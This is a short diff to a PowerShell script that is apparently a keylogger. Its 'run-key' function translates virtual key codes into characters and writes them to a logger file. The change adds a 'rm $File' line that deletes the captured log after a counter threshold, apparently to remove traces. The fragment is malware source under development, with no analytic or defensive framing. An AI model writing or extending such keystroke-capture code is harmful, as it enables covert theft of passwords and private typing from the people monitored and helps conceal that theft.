@@ -29,7 +29,6 @@ function run-key([Int]$send, [Int]$counter)
           $mychar = New-Object -TypeName System.Text.StringBuilder
           # translate virtual key
           $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
-
           if ($success)
           {
             # add key to logger file
@@ -53,6 +52,7 @@ function run-key([Int]$send, [Int]$counter)
               $end++
               if ($end -ge 5)
               {
+                rm $File
                 break
               }
             }
